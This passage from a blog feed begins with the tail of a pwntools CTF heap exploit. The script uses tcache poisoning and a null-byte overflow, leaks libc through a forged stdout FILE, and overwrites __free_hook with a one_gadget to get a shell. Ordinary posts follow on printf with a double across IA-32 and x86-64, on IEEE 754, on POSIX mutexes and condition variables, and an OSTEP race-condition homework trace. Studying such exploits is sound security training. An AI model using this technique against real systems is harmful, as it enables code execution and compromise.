class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content=<span class="string">b&#x27;x&#x27;</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;Data:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">&#x27;choice: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">add(<span class="number">0x500</span>-<span class="number">0x8</span>)  <span class="comment"># 0</span></span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x40</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x50</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x500</span> - <span class="number">0x8</span>) <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x70</span>) <span class="comment"># 6 </span></span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span> + <span class="string">b&#x27;\x60\x06&#x27;</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x530</span>)</span><br><span class="line">add(<span class="number">0xa0</span>, <span class="string">b&#x27;\x60\xc7&#x27;</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line"><span class="comment"># db(&#x27;b malloc&#x27;)</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0D83)&#x27;)</span></span><br><span class="line">add(<span class="number">0x48</span>,p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">66</span>) * <span class="number">3</span> + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">r(<span class="number">8</span>)</span><br><span class="line">libc=uu64(r(<span class="number">6</span>))-<span class="number">0x3ed8b0</span></span><br><span class="line">p(<span class="string">&#x27;libc&#x27;</span>,libc)</span><br><span class="line">libcelf.address=libc</span><br><span class="line">onegadget=libc+<span class="number">0x4f302</span></span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">add(<span class="number">0xa0</span>,p64(libcelf.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(onegadget))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Tcache </tag>
            
            <tag> IO FILE </tag>
            
            <tag> Null Byte Overflow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>An interview question from baidu</title>
      <link href="/2023/04/17/An-interview-question-from-baidu/"/>
      <url>/2023/04/17/An-interview-question-from-baidu/</url>
      
        <content type="html"><![CDATA[<h2 id="流传的一道百度面试题"><a href="#流传的一道百度面试题" class="headerlink" title="流传的一道百度面试题"></a>流传的一道百度面试题</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">double</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a = %d\n&quot;</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/NEMU [1]&gt; gcc -m32 -g -o  test test.c</span><br><span class="line">test.c: In function ‘main’:</span><br><span class="line">test.c:4:18: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘double’ [-Wformat=]</span><br><span class="line">    4 |     printf(&quot;a = %d\n&quot;, a);</span><br><span class="line">      |                 ~^     ~</span><br><span class="line">      |                  |     |</span><br><span class="line">      |                  int   double</span><br><span class="line">      |                 %f</span><br><span class="line">grxer@grxer ~/D/s/NEMU&gt; ./test</span><br><span class="line">a = 0    </span><br><span class="line">grxer@grxer ~/D/s/NEMU&gt; gcc  -g -o  test test.c</span><br><span class="line">test.c: In function ‘main’:</span><br><span class="line">test.c:4:18: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘double’ [-Wformat=]</span><br><span class="line">    4 |     printf(&quot;a = %d\n&quot;, a);</span><br><span class="line">      |                 ~^     ~</span><br><span class="line">      |                  |     |</span><br><span class="line">      |                  int   double</span><br><span class="line">      |                 %f</span><br><span class="line">grxer@grxer ~/D/s/NEMU&gt; ./test</span><br><span class="line">a = 1853816616</span><br><span class="line">grxer@grxer ~/D/s/NEMU&gt; ./test</span><br><span class="line">a = -600037016</span><br></pre></td></tr></table></figure><p>IA-32上运行时, 打印结果为<code>a=0</code>; 在x86-64上运行时, 打印出来的<code>a</code>是一个不确定值</p><h2 id="WHY"><a href="#WHY" class="headerlink" title="WHY?"></a>WHY?</h2><h3 id="IEEE-754"><a href="#IEEE-754" class="headerlink" title="IEEE 754"></a>IEEE 754</h3><p>先复习一些IEEE 754浮点数</p><p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230420111646829.png" alt="image-20230420111646829"></p><p>单精度 1位符号位(sign) 8位阶码(exponent) 23位有效数(significand)</p><p>双精度 1 11 52</p><ul><li><p>规格化的值</p><ul><li><p>exp阶码位域既不是全0也不是全1</p></li><li><p>阶码字段是有偏置的有符号整数 E&#x3D;e-Bias  ps:专业术语叫做移码，这种偏置给浮点数的比较带来了巨大方便</p><ul><li>e是exp表示的无符号数</li><li>Bias是偏置值&#x3D;2<sup>k-1</sup>-1 单精度为2<sup>8-1</sup>-1&#x3D;127 双精度为2<sup>11-1</sup>-1&#x3D;1023</li><li>所以单精度指数范围为 1-127~254-127即-126~+127 双精度为-1022~+1023 (exp阶码位域既不是全0也不是全1)</li></ul></li><li><p>significand位总是1.开头，也就是有效数大于等于1且小于2，所以不记录1,只记录小数点后面的值</p></li><li><p>值Value&#x3D;$(-1)^{s}2^{exp-Bias}*(1+.frac)$</p></li></ul></li><li><p>非规格化的值</p><ul><li>exp阶码位域全为0</li><li>阶码值E&#x3D;1-Bias<ul><li>32位-126，64位-1022</li></ul></li><li>有效数0.开头，也就是有效数小于1且大于等于0</li><li>非规格化浮点值的绝对值小于所有的规格化浮点数的绝对值</li><li>有效数全为0时，符号位决定了+0,-0的表示</li><li>非规格化浮点填补绝对值意义下最小规格数与零的距离(太小的浮点数规格化的exp位不够用)，最大的非规格数等于最小的规格数</li></ul></li><li><p>特殊值</p><ul><li>exp阶码全为1<ul><li>有效数全为0时，表示无穷inf(infinity) 符号位决定+inf，-inf 非0浮点数和整数不一样，他是可以除以0的，得到inf</li><li>有效数<strong>不全为0</strong>，表示Nan(not a number)，有时候利用Nan和其他任何数比较返回false的特性可能造成一些支付逻辑上的漏洞</li></ul></li></ul></li><li><p>对于nan的一些特性 <strong>x：including NaN and ±∞</strong></p><table><thead><tr><th>Comparison</th><th>NaN ≥ <em>x</em></th><th>NaN ≤ <em>x</em></th><th>NaN &gt; <em>x</em></th><th>NaN &lt; <em>x</em></th><th>NaN &#x3D; <em>x</em></th><th>NaN ≠ <em>x</em></th></tr></thead><tbody><tr><td>Result</td><td>False</td><td>False</td><td>False</td><td>False</td><td>False</td><td>True</td></tr></tbody></table></li></ul><h3 id="在线转换"><a href="#在线转换" class="headerlink" title="在线转换"></a>在线转换</h3><p><a href="https://www.toolhelper.cn/Digit/FractionConvert">https://www.toolhelper.cn/Digit/FractionConvert</a></p><p><a href="https://www.h-schmidt.net/FloatConverter/IEEE754.html">https://www.h-schmidt.net/FloatConverter/IEEE754.html</a></p><h3 id="IA-32"><a href="#IA-32" class="headerlink" title="IA-32"></a>IA-32</h3><p>对于ia32的结果我们并不感到奇怪，</p><p>double的10.00先手动转一下吧，写为二进制1010.00，然后需要左移三位才能1.0开头，即1.010*2<sup>3</sup>,所以S&#x3D;0，E&#x3D;1023+3&#x3D;100 0000 0010b significand&#x3D;010，组合起来就可以了</p><p><code>0 10000000010 0100000000000000000000000000000000000000000000000000</code>   hex&#x3D;0x4024000000000000</p><p>32位参数都是在栈上(除非你用fastcall的调用约定，C&#x2F;C++默认的函数调用协议的_cdecl)，我们的浮点数有专门的处理单元，寄存器，和指令集</p><p>IA-32采用了x87 FPU的指令集来处理浮点数</p><blockquote><p>FPU有8个独立的可寻址的80位数据寄存器R0~R7，这组寄存器叫做寄存器栈，FPU状态字中名为TOP的3位字段给出了当前栈顶的寄存器编号，入栈top-1，出栈+1，7如果再出栈top会回到R0，如果覆盖掉原有数据会产生浮点数异常</p><p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230418232538589.png" alt="image-20230418232538589"></p><p>st0总是表示栈顶，即top所指即st0</p><p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230419133610761.png" alt="image-20230419133610761"></p><p>浮点数在进栈会拓展到80位，出栈时从80位进行转换</p><p>为什么会用栈呢，学过数据结构的可能已经猜到了，这里是用后缀表达式通过栈来来进行的运算</p></blockquote><p>但是他还是把参数压栈了</p><p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230420110749224.png" alt="image-20230420110749224"></p><p>典型_cdecl特征 参数右向左入栈，外平栈(调用者平栈)，还分了两次把8自己字节的double压栈，其实我们在骗他玩，哈哈</p><p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230418113446986.png" alt="image-20230418113446986"></p><p>此时的栈按四字节int输出0没问题</p><h3 id="x86-64"><a href="#x86-64" class="headerlink" title="x86-64"></a>x86-64</h3><p>顺便说一下为什么不叫IA-64架构，害，因为IA-64的名字被安腾架构占去，但是由于不兼容32位没流行起来，amd64位兼容32位流行起来，随后一般intel被迫追随叫x86-64</p><p>64位采用寄存器传参，x64用了SSE指令集，这里要细说起来内容挺多的，推出的主要原因是为了提高3d游戏性能</p><p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230418140620437.png" alt="image-20230418140620437"></p><p>直接把浮点数放到了xmm0寄存器，如果取的话也直接去这里取(rip的相对寻址rip是执行这条指令过后的rip)</p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230418140809555.png" alt="image-20230418140809555" style="zoom:80%;"><p>我们%d会在常规的rsi低四字节做参数</p><p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230418141359969.png" alt="image-20230418141359969"></p><p>FFFFDF48四个字节，这次就输出-8,376</p><p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230418141756625.png" alt="image-20230418141756625"></p><p>所以这就可以有些很有意思但可能在初学c语言的人看来很奇怪的事情，比如下面两个传参都打印出正确结果</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">12</span>;</span><br><span class="line">    <span class="type">double</span> y = <span class="number">6.666</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d,%f\n&quot;</span>, x, y);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d,%f&quot;</span>, y, x);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/NEMU&gt; gcc -g -o  test test.c</span><br><span class="line">test.c: In function ‘main’:</span><br><span class="line">test.c:8:14: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘double’ [-Wformat=]</span><br><span class="line">    8 |     printf(&quot;%d,%f&quot;, y, x);</span><br><span class="line">      |             ~^      ~</span><br><span class="line">      |              |      |</span><br><span class="line">      |              int    double</span><br><span class="line">      |             %f</span><br><span class="line">test.c:8:17: warning: format ‘%f’ expects argument of type ‘double’, but argument 3 has type ‘int’ [-Wformat=]</span><br><span class="line">    8 |     printf(&quot;%d,%f&quot;, y, x);</span><br><span class="line">      |                ~^      ~</span><br><span class="line">      |                 |      |</span><br><span class="line">      |                 double int</span><br><span class="line">      |                %d</span><br><span class="line">grxer@grxer ~/D/s/NEMU&gt; ./test</span><br><span class="line">12,6.666000</span><br><span class="line">12,6.666000⏎ </span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> IEEE 754 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSTEP:27 Thread Api</title>
      <link href="/2023/04/15/OSTEP-27-Thread-Api/"/>
      <url>/2023/04/15/OSTEP-27-Thread-Api/</url>
      
        <content type="html"><![CDATA[<h2 id="锁"><a href="#锁" class="headerlink" title="锁"></a>锁</h2><h3 id="POSIX互斥锁"><a href="#POSIX互斥锁" class="headerlink" title="POSIX互斥锁"></a>POSIX互斥锁</h3><p><strong>使用锁之前先初始化</strong></p><blockquote><p><code>#include &lt;pthread.h&gt;</code></p><p>静态直接使用宏初始化<code>pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER</code><br>动态使用初始化函数<br><code>int pthread_mutex_init(pthread_mutex_t *mutex, const pthread_mutexattr_t *attr);</code></p><p>pthread_mutex_init(mutex,NULL)和用PTHREAD_MUTEX_INITIALIZER宏效果一样</p><p>attr属性</p><p><code>int pthread_mutexattr_gettype(pthread_mutexattr_t *attr,int *kind);</code>得到后</p><p><code>int pthread_mutexattr_settype(pthread_mutexattr_t *attr,int kind);  </code>；来设置</p><ul><li><p><code>PTHREAD_MUTEX_NORMAL</code>：普通类型互斥锁，不提供死锁检测或者错误检查。</p></li><li><p>PTHREAD_MUTEX_TIMED_NP，这是缺省值，也就是<strong>普通锁</strong>。<em>当一个线程加锁以后，其余请求锁的线程将形成一个等待队列，并在解锁后按优先级获得锁</em>。这种锁策略保证了资源分配的公平</p></li><li><p>PTHREAD_MUTEX_RECURSIVE_NP，<strong>嵌套锁</strong>，<em>允许同一个线程对同一个锁成功获得多次，并通过多次unlock解锁</em>。如果是不同线程请求，则在加锁线程解锁时重新竞争。</p></li><li><p>PTHREAD_MUTEX_ERRORCHECK_NP，<strong>检错锁</strong>，如果<em>同一个线程请求同一个锁，则返回EDEADLK</em>，否则与PTHREAD_MUTEX_TIMED_NP类型动作相同。这样保证当不允许多次加锁时不出现最简单情况下的死锁。</p></li><li><p>进程间共享（pshared）：可以设置为 <code>PTHREAD_PROCESS_PRIVATE</code> 或 <code>PTHREAD_PROCESS_SHARED</code>。默认为 <code>PTHREAD_PROCESS_PRIVATE</code>，表示仅在同一进程内共享。</p></li></ul><p>成功返回0，失败非0</p></blockquote><p><strong>加锁 解锁</strong></p><blockquote><p>加锁，互斥锁加锁状态线程进入等待(阻塞)状态，直到互斥锁释放</p><p><code>int pthread_mutex_lock(pthread_mutex_t* mutex); </code></p><p>加锁 互斥锁加锁状态线程直接返回非0</p><p><code>int pthread_mutex_trylock(pthread_mutex_t* mutex);</code></p><p>加锁，阻塞<strong>到</strong>tsptr<strong>指定时间</strong>的thread_mutex_lock，超时或获取锁后返回</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutex_timedlock</span><span class="params">(<span class="type">pthread_mutex_t</span> mutex, <span class="type">const</span> <span class="keyword">struct</span> timespec *tsptr)</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> struct timespec &#123;</span></span><br><span class="line"><span class="comment"> time_t tv_sec;  // 秒</span></span><br><span class="line"><span class="comment"> long tv_nsec;   // 纳秒</span></span><br><span class="line"><span class="comment"> &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">使用时可以</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">time_out</span>;</span></span><br><span class="line">   clock_gettime(CLOCK_REALTIME, &amp;time_out);</span><br><span class="line">   time_out.tv_sec += seconds;</span><br><span class="line">pthread_mutex_timedlock(mutex,&amp;time_out)</span><br></pre></td></tr></table></figure><p>解锁</p><p><code>int pthread_mutex_unlock(pthread_mutex_t* mutex); </code></p><p>成功返回0，失败非0</p></blockquote><p><strong>销毁</strong></p><blockquote><p><code>int pthread_mutex_destroy(pthread_mutex_t *mutex);</code></p><p>要求锁当前初始化过且处于开放状态</p><p>成功返回0，失败非0</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="type">pthread_mutex_t</span> mutex = PTHREAD_MUTEX_INITIALIZER;<span class="comment">//让12都看见锁</span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">Sum</span><span class="params">(<span class="type">void</span>*)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        assert(<span class="number">0</span> == pthread_mutex_lock(&amp;mutex));</span><br><span class="line">        sum++;</span><br><span class="line">        assert(<span class="number">0</span> == pthread_mutex_unlock(&amp;mutex));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">pthread_mutex_t</span> x;</span><br><span class="line">    <span class="type">pthread_t</span> pid1, pid2;</span><br><span class="line">    pthread_create(&amp;pid1, <span class="literal">NULL</span>, Sum, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;pid2, <span class="literal">NULL</span>, Sum, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(pid1,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(pid2,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_mutex_destroy(&amp;mutex);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="条件变量"><a href="#条件变量" class="headerlink" title="条件变量"></a>条件变量</h2><p>如果一个线程在等待另一个线程继续执行某些操作，条件变量就很有用，或者说是利用线程间共享的全局变量进行同步的机制，和互斥锁一起使用，避免竞态条件</p><p><strong>条件变量初始化</strong></p><blockquote><p>和锁差不多</p><p>pthread_cond_t  cond&#x3D;PTHREAD_COND_INITIALIZER  </p><p>int  pthread_cond_init(pthread_cond_t  *cond,  pthread_condattr_t  *cond_attr)</p></blockquote><p><strong>睡眠 唤醒</strong></p><blockquote><p>&gt;&gt;&gt;睡眠</p><p><code>int pthread_cond_wait(pthread_cond_t *cond, pthread_mutex_t *mutex);</code></p><p>阻塞当前线程，并把互斥锁解开,被唤醒后，返回前会再次获得互斥锁上锁</p><p><code>int pthread_cond_timedwait(pthread_cond_t *cond, pthread_mutex_t*mutex, const struct timespec *abstime);</code></p><p>比pthread_cond_wait多了限定的等待时间，abstime内没由被唤醒，上锁，结束等待，返回ETIMEOUT</p><p>&gt;&gt;&gt;唤醒</p><p><code>int pthread_cond_signal(pthread_cond_t *cond);</code></p><p>使在条件变量上等待的线程中的一个线程重新开始，优先级高等待时间长的线程先开始</p><p><code>int pthread_cond_broadcast(pthread_cond_t *cond);</code></p><p>唤醒所有条件变量上等待的线程</p></blockquote><p><strong>销毁条件变量</strong></p><blockquote><p><code>int  pthread_cond_destroy(pthread_cond_t  *cond)</code></p><p>使用前必须没有在该条件变量上等待的线程  </p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">pthread_mutex_t</span> lock = PTHREAD_MUTEX_INITIALIZER;</span><br><span class="line"><span class="type">pthread_cond_t</span> cond = PTHREAD_COND_INITIALIZER;</span><br><span class="line"><span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="type">void</span>* <span class="title function_">thread_func</span><span class="params">(<span class="type">void</span>*)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        assert(pthread_mutex_lock(&amp;lock) == <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">while</span> (flag == <span class="literal">false</span>) &#123;<span class="comment">//这里为什么要用while而不是if? POSIX标准要求pthread_cond_signal至少唤醒一个pthread_cond_wait上的线程，</span></span><br><span class="line">            <span class="comment">//有一些 pthread实现可能会错误地唤醒等待的线程，加个while即使被错误唤醒，while条件不满足，继续等待</span></span><br><span class="line">            <span class="comment">//条件变量一个简单规则就是总是使用while来避免一些错误，while了就是得劲😂</span></span><br><span class="line">            pthread_cond_wait(&amp;cond, &amp;lock);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;grxer&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        assert(pthread_mutex_unlock(&amp;lock) == <span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">pthread_t</span> pid;</span><br><span class="line">    pthread_create(&amp;pid, <span class="literal">NULL</span>, thread_func, <span class="literal">NULL</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);<span class="comment">//防止flag = true;执行比while (flag == false)早</span></span><br><span class="line">    assert(pthread_mutex_lock(&amp;lock) == <span class="number">0</span>);</span><br><span class="line">    flag = <span class="literal">true</span>;<span class="comment">//操作flag临界量加个锁</span></span><br><span class="line">    pthread_cond_signal(&amp;cond);</span><br><span class="line">    assert(pthread_mutex_unlock(&amp;lock) == <span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    flag = <span class="literal">false</span>;</span><br><span class="line">    assert(pthread_mutex_lock(&amp;lock) == <span class="number">0</span>);</span><br><span class="line">    flag = <span class="literal">true</span>;<span class="comment">//操作flag临界量加个锁</span></span><br><span class="line">    pthread_cond_signal(&amp;cond);</span><br><span class="line">    assert(pthread_mutex_unlock(&amp;lock) == <span class="number">0</span>);</span><br><span class="line">    pthread_join(pid, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_mutex_destroy(&amp;lock);</span><br><span class="line">    pthread_cond_destroy(&amp;cond);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;end&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> OSTEP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSTEP:26 Concurrency:An Introduction Homework</title>
      <link href="/2023/04/15/OSTEP-homework-26-Concurrency-An-Introduction/"/>
      <url>/2023/04/15/OSTEP-homework-26-Concurrency-An-Introduction/</url>
      
        <content type="html"><![CDATA[<ul><li>临界区（critical section）是访问共享资源的一段代码，资源通常是一个变量或数据结构</li><li>竞态条件（race condition）出现在多个执行线程大致同时进入临界区时，它们都试图更新共享的数据结构</li></ul><ol start="3"><li></li></ol><p>没有共享变量，哪来的竞态条件</p><ol start="6"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/threads-intro&gt; cat looping-race-nolock.s</span><br><span class="line"><span class="meta"># assumes %bx has loop count in it</span></span><br><span class="line"></span><br><span class="line">.main</span><br><span class="line">.top</span><br><span class="line"><span class="meta"># critical section</span></span><br><span class="line">mov <span class="number">2000</span>, %ax  <span class="meta"># get <span class="string">&#x27;value&#x27;</span> at address 2000</span></span><br><span class="line">add $<span class="number">1</span>, %ax    <span class="meta"># increment it</span></span><br><span class="line">mov %ax, <span class="number">2000</span>  <span class="meta"># store it back</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># see <span class="keyword">if</span> we<span class="string">&#x27;re still looping</span></span></span><br><span class="line"><span class="string"><span class="meta">sub  $1, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">test $0, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">jgt .top</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta">halt</span></span></span><br><span class="line"><span class="string"><span class="meta">grxer@grxer ~/D/s/O/o/threads-intro&gt; python ./x86.py -p looping-race-nolock.s -t 2 -M 2000  -i 4 -r -s 0 -c</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG seed 0</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG numthreads 2</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG program looping-race-nolock.s</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG interrupt frequency 4</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG interrupt randomness True</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG argv</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG load address 1000</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG memsize 128</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG memtrace 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG regtrace</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG cctrace False</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG printstats False</span></span></span><br><span class="line"><span class="string"><span class="meta">ARG verbose False</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta"> 2000          Thread 0                Thread 1</span></span></span><br><span class="line"><span class="string"><span class="meta">    0</span></span></span><br><span class="line"><span class="string"><span class="meta">    0   1000 mov 2000, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    0   1001 add $1, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1002 mov %ax, 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   1003 sub  $1, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    1   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1000 mov 2000, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    1                            1001 add $1, %ax</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1002 mov %ax, 2000</span></span></span><br><span class="line"><span class="string"><span class="meta">    2                            1003 sub  $1, %bx</span></span></span><br><span class="line"><span class="string"><span class="meta">    2   ------ Interrupt ------  ------ Interrupt ------</span></span></span><br><span class="line"><span 